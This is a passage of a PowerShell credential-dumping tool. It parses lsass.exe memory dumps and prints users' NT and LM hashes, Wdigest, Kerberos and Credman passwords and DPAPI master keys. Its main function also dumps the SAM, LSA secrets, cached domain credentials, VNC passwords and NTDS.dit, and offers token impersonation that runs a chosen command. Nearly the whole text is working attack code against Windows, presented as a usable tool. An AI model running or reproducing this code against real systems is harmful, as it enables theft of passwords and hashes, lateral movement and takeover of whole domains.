	$Global:PROCESSOR_ARM920        = 2336   # ARM 920 (Windows CE)
	$Global:PROCESSOR_ARM_7TDMI     = 70001  # ARM 7TDMI (Windows CE)
	$Global:PROCESSOR_OPTIL         = 0x494F # MSIL

	$Global:MINBUILD_WIN_XP = 2500
	$Global:MINBUILD_WIN_2K3 = 3000
	$Global:MINBUILD_WIN_VISTA = 5000
	$Global:MINBUILD_WIN_7 = 7000
	$Global:MINBUILD_WIN_8 = 8000
	$Global:MINBUILD_WIN_BLUE = 9400
	$Global:MINBUILD_WIN_10 = 9800
	$Global:MINBUILD_WIN_11 = 22000

	$Global:BUILD_WIN_XP  = 2600
	$Global:BUILD_WIN_2K3 = 3790
	$Global:BUILD_WIN_VISTA = 6000
	$Global:BUILD_WIN_7 = 7600
	$Global:BUILD_WIN_8 = 9200
	$Global:BUILD_WIN_BLUE = 9600
	$Global:BUILD_WIN_10_1507 = 10240
	$Global:BUILD_WIN_10_1511 = 10586
	$Global:BUILD_WIN_10_1607 = 14393
	$Global:BUILD_WIN_10_1703 = 15063
	$Global:BUILD_WIN_10_1709 = 16299
	$Global:BUILD_WIN_10_1803 = 17134
	$Global:BUILD_WIN_10_1809 = 17763
	$Global:BUILD_WIN_10_1903 = 18362
	$Global:BUILD_WIN_10_1909 = 18363
	$Global:BUILD_WIN_10_2004 = 19041
	$Global:BUILD_WIN_10_20H2 = 19042
	$Global:BUILD_WIN_11_2022 = 20348

	<### Get LSA decryption keys ###>

	$LSADecryptor = LSASS-Get-LSAEncryptionKeys $Dump
	If (-not $LSADecryptor) { return $Null }

	<### Decrypt stored secrets into lsass.exe ###>

	$LogonSessions = $Null
	$OrphanedCreds = $Null

	$MSVDecryptor = LSASS-Get-MSVSecrets $Dump $LSADecryptor
	If ($MSVDecryptor) { $LogonSessions = $MSVDecryptor["Logon_Sessions"] }

	$WdigestDecryptor = LSASS-Get-WdigestSecrets $Dump $LSADecryptor
	If ($WdigestDecryptor)
	{
		ForEach ($WdigestCredential in $WdigestDecryptor["Credentials"])
		{
			If ($LogonSessions.Keys -Contains $WdigestCredential["LUID"])
			{
				$LogonSessions[$WdigestCredential["LUID"]]["Wdigest_Creds"] += ,($WdigestCredential)
			}
			Else
			{
				$OrphanedCreds += ,($WdigestCredential)
			}
		}
	}

	$KerberosDecryptor = LSASS-Get-KerberosSecrets $Dump $LSADecryptor
	If ($KerberosDecryptor)
	{
		ForEach ($KerberosCredential in $KerberosDecryptor["Credentials"])
		{
			If ($LogonSessions.Keys -Contains $KerberosCredential["LUID"])
			{
				$LogonSessions[$KerberosCredential["LUID"]]["Kerberos_Creds"] += ,($KerberosCredential)
			}
			Else
			{
				$OrphanedCreds += ,($KerberosCredential)
			}
		}
	}

	$DPAPIDecryptor = LSASS-Get-DPAPISecrets $Dump $LSADecryptor
	If ($DPAPIDecryptor)
	{
		ForEach ($DPAPICredential in $DPAPIDecryptor["Credentials"])
		{
			If ($LogonSessions.Keys -Contains $DPAPICredential["LUID"])
			{
				$LogonSessions[$DPAPICredential["LUID"]]["DPAPI_Creds"] += ,($DPAPICredential)
			}
			Else
			{
				$OrphanedCreds += ,($DPAPICredential)
			}
		}
	}

	# TODO: LSASS-Get-<Other>Secrets $Dump $LSADecryptor

	<### Print results ###>

	<#
		Print creds from logon sessions
	#>
	$LogonSessionNb = 1
	If ($LogonSessions)
	{
		ForEach ($LogonSessionKey in $LogonSessions.Keys)
		{
			$LogonSession = $LogonSessions[$LogonSessionKey]
			Write-Host ("[...] Logon Session {0}" -f ($LogonSessionNb))
			$LogonSessionNb += 1

			If ($LogonSession["Authentication_Id"]) { Write-Host ("`tAuthentication ID = {0}" -f ($LogonSession["Authentication_Id"])) } Else { Write-Host "`tAuthentication ID = None" }
			If ($LogonSession["Session_Id"]) { Write-Host ("`tSession ID = {0}" -f ($LogonSession["Session_Id"])) } Else { Write-Host "`tSession ID = None" }
			If ($LogonSession["UserName"]) { Write-Host ("`tUserName = {0}" -f ($LogonSession["UserName"])) } Else { Write-Host "`tUserName = None" }
			If ($LogonSession["Domain"]) { Write-Host ("`tDomain = {0}" -f ($LogonSession["Domain"])) } Else { Write-Host "`tDomain = None" }
			If ($LogonSession["LogonServer"]) { Write-Host ("`tLogon Server = {0}" -f ($LogonSession["LogonServer"])) } Else { Write-Host "`tLogon Server = None" }
			If ($LogonSession["LogonTime"]) { Write-Host ("`tLogon Time = {0}" -f ($LogonSession["LogonTime"])) } Else { Write-Host "`tLogon Time = None" }
			If ($LogonSession["SID"]) { Write-Host ("`tSID = {0}" -f ($LogonSession["SID"])) } Else { Write-Host "`tSID = None" }
			If ($LogonSession["LUID"]) { Write-Host ("`tLUID = {0}" -f ($LogonSession["LUID"])) } Else { Write-Host "`tLUID = None" }

			$MSVNb = 1
			ForEach ($MSVCred in $LogonSession["MSV_Creds"])
			{
				Write-Host ("`t`t*** MSV Credential {0} ***" -f ($MSVNb))
				$MSVNb += 1

				If ($MSVCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($MSVCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
				If ($MSVCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($MSVCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
				If ($MSVCred["LMHash"]) { Write-Host ("`t`tLM = {0}" -f ([System.BitConverter]::ToString($MSVCred["LMHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tLM = None") }
				If ($MSVCred["NTHash"]) { Write-Host ("`t`tNT = {0}" -f ([System.BitConverter]::ToString($MSVCred["NTHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tNT = None") }
				If ($MSVCred["SHAHash"]) { Write-Host ("`t`tSHA1 = {0}" -f ([System.BitConverter]::ToString($MSVCred["SHAHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tSHA1 = None") }
				If ($MSVCred["DPAPI"])
				{
					If (@(Compare-Object $MSVCred["DPAPI"] (New-Object byte[] 16) -SyncWindow 0).Length -ne 0) { Write-Host ("`t`tDPAPI = {0}" -f ([System.BitConverter]::ToString($MSVCred["DPAPI"]).Replace("-", ""))) } Else { Write-Host ("`t`tDPAPI = None") }
				}
			}

			$CredmanNb = 1
			ForEach ($CredmanCred in $LogonSession["Credman_Creds"])
			{
				Write-Host ("`t`t*** Credman Credential {0} ***" -f ($CredmanNb))
				$CredmanNb += 1

				If ($CredmanCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($CredmanCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
				If ($CredmanCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($CredmanCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
				If ($CredmanCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($CredmanCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
			}

			$WdigestNb = 1
			ForEach ($WdigestCred in $LogonSession["Wdigest_Creds"])
			{
				Write-Host ("`t`t*** Wdigest Credential {0} ***" -f ($WdigestNb))
				$WdigestNb += 1

				If ($WdigestCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($WdigestCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
				If ($WdigestCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($WdigestCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
				If ($WdigestCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($WdigestCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
			}

			$KerberosNb = 1
			ForEach ($KerberosCred in $LogonSession["Kerberos_Creds"])
			{
				Write-Host ("`t`t*** Kerberos Credential {0} ***" -f ($KerberosNb))
				$KerberosNb += 1

				If ($KerberosCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($KerberosCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
				If ($KerberosCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($KerberosCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
				If ($KerberosCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($KerberosCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
			}

			$DPAPINb = 1
			ForEach ($DPAPICred in $LogonSession["DPAPI_Creds"])
			{
				Write-Host ("`t`t*** DPAPI Credential {0} ***" -f ($DPAPINb))
				$DPAPINb += 1

				Write-Host ("`t`tMasterKey GUID = {0}" -f ($DPAPICred["Key_GUID"]))
				Write-Host ("`t`tMasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["MasterKey"]).Replace("-", "")))
				Write-Host ("`t`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["SHA1_MasterKey"]).Replace("-", "")))
			}
		}
	}

	<#
		Print orphaned creds
	#>
	$OrphanedCredsNb = 1
	If ($OrphanedCreds)
	{
		ForEach ($OrphanedCred in $OrphanedCreds)
		{
			Write-Host ("[...] Orphaned Credential {0}" -f ($OrphanedCredsNb))
			$OrphanedCredsNb += 1

			Switch ($OrphanedCred["CredType"])
			{
				"Wdigest"
				{
					Write-Host ("`t*** Wdigest Credential ***")

					If ($OrphanedCred["UserName"]) { Write-Host ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`tUserName = None") }
					If ($OrphanedCred["Domain"]) { Write-Host ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`tDomain = None") }
					If ($OrphanedCred["Password"]) { Write-Host ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`tHex Pwd = None") }
				}
				"Kerberos"
				{
					Write-Host ("`t*** Kerberos Credential ***")

					If ($OrphanedCred["UserName"]) { Write-Host ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`tUserName = None") }
					If ($OrphanedCred["Domain"]) { Write-Host ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`tDomain = None") }
					If ($OrphanedCred["Password"]) { Write-Host ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`tHex Pwd = None") }
				}
				"DPAPI"
				{
					Write-Host ("`t*** DPAPI Credential ***" -f ($DPAPINb))

					Write-Host ("`tMasterKey GUID = {0}" -f ($OrphanedCred["Key_GUID"]))
					Write-Host ("`tMasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["MasterKey"]).Replace("-", "")))
					Write-Host ("`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["SHA1_MasterKey"]).Replace("-", "")))
				}
			}
		}
	}

	return ($LogonSessions, $OrphanedCreds)
}

<#
	Dump then parse lsass.exe
#>
function Get-LSASS($Method)
{
	Write-Host ("`n[===] Get LSASS secrets using {0} method [===]" -f ($Method))

	$Dump = Dump-LSASS($Method)
	If ($Dump)
	{
		$LogonSessions, $OrphanedCreds = Parse-LSASS($Dump)

		# Extract Pwds/NT Hashes/MasterKeys from LSASS for DPAPI
		$Pwds = @{}
		$NTHs = @{}
		$MasterKeys = @()
		If ($LogonSessions)
		{
			ForEach ($LogonSessionKey in $LogonSessions.Keys)
			{
				$LogonSession = $LogonSessions[$LogonSessionKey]

				# Get MasterKeys
				ForEach ($DPAPICred in $LogonSession["DPAPI_Creds"])
				{
					$MasterKeys += ,($DPAPICred)
				}

				# Get Pwds/NT Hashes
				If ($LogonSession["SID"])
				{
					ForEach ($MSVCred in $LogonSession["MSV_Creds"])
					{
						If ($MSVCred["NTHash"])
						{
							$NTHash = @{}
							$NTHash["Origin"] = "LSASS MSV"
							$NTHash["Value"] = $MSVCred["NTHash"]
							$SID = $LogonSession["SID"]
							$KeyExist = $False
							ForEach ($Key in $NTHs.Keys)
							{
								If ($Key -eq $SID)
								{
									$KeyExist = $True
									$HashExist = $False
									ForEach ($Hash in $NTHs[$Key])
									{
										If (@(Compare-Object $Hash["Value"] $NTHash["Value"] -SyncWindow 0).Length -eq 0)
										{
											$HashExist = $True
											Break
										}
									}

									If (-not ($HashExist)) { $NTHs[$Key] += ,($NTHash) }
									Break
								}
							}

							If (-not $KeyExist)
							{
								$NTHs[$SID] = @()
								$NTHs[$SID] += ,($NTHash)
							}
						}
					}

					ForEach ($CredmanCred in $LogonSession["Credman_Creds"])
					{
						If ($CredmanCred["Password"])
						{
							$Pwd = @{}
							$Pwd["Origin"] = "LSASS Credman"
							$Pwd["Value"] = $CredmanCred["Password"]
							$SID = $LogonSession["SID"]
							$KeyExist = $False
							ForEach ($Key in $Pwds.Keys)
							{
								If ($Key -eq $SID)
								{
									$KeyExist = $True
									$PwdExist = $False
									ForEach ($Password in $Pwds[$Key])
									{
										If (@(Compare-Object $Password["Value"] $Pwd["Value"] -SyncWindow 0).Length -eq 0)
										{
											$PwdExist = $True
											Break
										}
									}

									If (-not ($PwdExist)) { $Pwds[$Key] += ,($Pwd) }
									Break
								}
							}

							If (-not $KeyExist)
							{
								$Pwds[$SID] = @()
								$Pwds[$SID] += ,($Pwd)
							}
						}
					}

					ForEach ($WdigestCred in $LogonSession["Wdigest_Creds"])
					{
						If ($WdigestCred["Password"])
						{
							$Pwd = @{}
							$Pwd["Origin"] = "LSASS Wdigest"
							$Pwd["Value"] = $WdigestCred["Password"]
							$SID = $LogonSession["SID"]
							$KeyExist = $False
							ForEach ($Key in $Pwds.Keys)
							{
								If ($Key -eq $SID)
								{
									$KeyExist = $True
									$PwdExist = $False
									ForEach ($Password in $Pwds[$Key])
									{
										If (@(Compare-Object $Password["Value"] $Pwd["Value"] -SyncWindow 0).Length -eq 0)
										{
											$PwdExist = $True
											Break
										}
									}

									If (-not ($PwdExist)) { $Pwds[$Key] += ,($Pwd) }
									Break
								}
							}

							If (-not $KeyExist)
							{
								$Pwds[$SID] = @()
								$Pwds[$SID] += ,($Pwd)
							}
						}
					}

					ForEach ($KerberosCred in $LogonSession["Kerberos_Creds"])
					{
						If ($KerberosCred["Password"])
						{
							$Pwd = @{}
							$Pwd["Origin"] = "LSASS Kerberos"
							$Pwd["Value"] = $KerberosCred["Password"]
							$SID = $LogonSession["SID"]
							$KeyExist = $False
							ForEach ($Key in $Pwds.Keys)
							{
								If ($Key -eq $SID)
								{
									$KeyExist = $True
									$PwdExist = $False
									ForEach ($Password in $Pwds[$Key])
									{
										If (@(Compare-Object $Password["Value"] $Pwd["Value"] -SyncWindow 0).Length -eq 0)
										{
											$PwdExist = $True
											Break
										}
									}

									If (-not ($PwdExist)) { $Pwds[$Key] += ,($Pwd) }
									Break
								}
							}

							If (-not $KeyExist)
							{
								$Pwds[$SID] = @()
								$Pwds[$SID] += ,($Pwd)
							}
						}
					}
				}
			}
		}
		If ($OrphanedCreds)
		{
			ForEach ($OrphanedCred in $OrphanedCreds)
			{
				# Get MasterKeys
				If ($OrphanedCred["CredType"] -eq "DPAPI")
				{
					$MasterKeys += ,($OrphanedCred)
				}

				# Do not get Pwds/NT hashes for orphaned credentials
				# Because they do nat have SID and they are required to compute DPAPI PreKeys
			}
		}

		return ($Pwds, $NTHs, $MasterKeys)
	}
	Else
	{
		return $Null
	}
}

<########>
<# MAIN #>
<########>

function Get-WindowsSecrets()
{
	<#
		Get-WindowsSecrets: Call to functions to get Windows Secrets (BootKey, SAM, LSA Secrets, Cached Domain Creds, DPAPI Secrets, VNC pwds, NTDS.dit, LSASS, Session Tokens)
			- For DPAPI Secrets, It is very slow for MasterKeys decryption, you can skip with -SkipDPAPI parameter
	#>
	Param(
		[Parameter(Mandatory=$False)][String]$Creds,	# Format = <UserName1>:<Pwd1>/<UserName2>@<Domain>:<Pwd2>/...
		[Parameter(Mandatory=$False)][String]$NTHashes,	# Format = <UserName1>:<HexNTH1>/<UserName2>@<Domain>:<HexNTH2>/...
		[Parameter(Mandatory=$False)][Boolean]$SkipDPAPI,
		[Parameter(Mandatory=$False)][String]$ImpersonateTokenProcID, # Format = <ProcID>
		[Parameter(Mandatory=$False)][String]$ImpersonateMethod, # Possible values = "ImpersonateLoggedOnUser" | "CreateProcessWithToken" | "CreateProcessAsUser"
		[Parameter(Mandatory=$False)][String]$ImpersonateIsSystem, # Format = "True"/"False",
		[Parameter(Mandatory=$False)][String]$ImpersonateConnectTokenPipe, # Format = "True"/"False"
		[Parameter(Mandatory=$False)][String]$ImpersonateCommand # Format = "Null"/<CmdToExecute>
		)

	# Check administrator privileges, otherwise exit
	$CurrentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
	If (-not $CurrentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
	{
		Write-Host ("`n[ERROR] Script must be run with administrator privileges. Exit`n")
		Exit
	}

	If ($ImpersonateTokenProcID)
	{

		ImpersonateToken -ProcID $ImpersonateTokenProcID -Method $ImpersonateMethod -IsSystem $ImpersonateIsSystem -ConnectTokenPipe $ImpersonateConnectTokenPipe -ImpersonateCommand $ImpersonateCommand
		return
	}

	$Tokens = ListSessionTokens

	$Pwds, $NTHs, $MasterKeys = Get-LSASS -Method "ProcOpen"

	$BootKey = Get-BootKey
	$SAM = Get-SAM $BootKey

	$LSASecretKey = Get-LSASecretKey $BootKey
	$LSASecrets = Get-LSASecrets $LSASecretKey

	$NLKM = $LSASecrets['NL$KM']["CurrVal"]
	$CachedDomainCreds = Get-CachedDomainCreds $NLKM

	If (-not ($SkipDPAPI))
	{
		# Get potential Pwds/NT Hashes from parameters for DPAPI PreKeys
		If ($Creds)
		{
			If (-not $Pwds) { $Pwds = @{} }

			$Accounts = $Creds -Split "/"
			ForEach ($Account in $Accounts)
			{
				$User, $Password = $Account -Split ":"
				Try
				{
					$SID = ((New-Object System.Security.Principal.NTAccount($User)).Translate([System.Security.Principal.SecurityIdentifier])).Value
					$Pwd = @{}
					$Pwd["Origin"] = "Script parameter"
					$Pwd["Value"] = [Text.Encoding]::Unicode.GetBytes($Password)
					$KeyExist = $False
					ForEach ($Key in $Pwds.Keys)
					{
						If ($Key -eq $SID)
						{
							$KeyExist = $True
							$PwdExist = $False
							ForEach ($Password in $Pwds[$Key])
							{
								If ($Password["Value"] -eq $Pwd["Value"])
								{
									$PwdExist = $True
									Break
								}
							}

							If (-not ($PwdExist)) { $Pwds[$Key] += ,($Pwd) }
							Break
						}
					}

					If (-not $KeyExist)
					{
						$Pwds[$SID] = @()
						$Pwds[$SID] += ,($Pwd)
					}
				}
				Catch
				{
					Write-Host ("`n[WARNING] User '{0}' do not exist" -f ($User))
				}
			}
		}

		If ($NTHashes)
		{
			If (-not $NTHs) { $NTHs = @{} }

			$Accounts = $NTHashes -Split "/"
			ForEach ($Account in $Accounts)
			{
				$User, $HexNTH = $Account -Split ":"
				Try
				{
					$SID = ((New-Object System.Security.Principal.NTAccount($User)).Translate([System.Security.Principal.SecurityIdentifier])).Value
					$NTHash = @{}
					$NTHash["Origin"] = "Script parameter"
					$NTHash["Value"] = HexStringToBytes($HexNTH)
					$KeyExist = $False
					ForEach ($Key in $NTHs.Keys)
					{
						If ($Key -eq $SID)
						{
							$KeyExist = $True
							$HashExist = $False
							ForEach ($Hash in $NTHs[$Key])
							{
								If (@(Compare-Object $Hash["Value"] $NTHash["Value"] -SyncWindow 0).Length -eq 0)
								{
									$HashExist = $True
									Break
								}
							}

							If (-not ($HashExist)) { $NTHs[$Key] += ,($NTHash) }
							Break
						}
					}

					If (-not $KeyExist)
					{
						$NTHs[$SID] = @()
						$NTHs[$SID] += ,($NTHash)
					}
				}
				Catch
				{
					Write-Host ("`n[WARNING] User '{0}' do not exist" -f ($User))
				}
			}
		}

		$LSA_DPAPI_SYSTEM = $LSASecrets["DPAPI_SYSTEM"]["CurrVal"]
		$MasterKeys = Get-MasterKeysFromFiles $LSA_DPAPI_SYSTEM $SAM $Pwds $NTHs $MasterKeys
		Get-DPAPISecrets $MasterKeys
	}

	Get-VNCPwds
	$Users = Get-NTDS -Method "Shadow Copy" $BootKey

	Write-Host ""
}
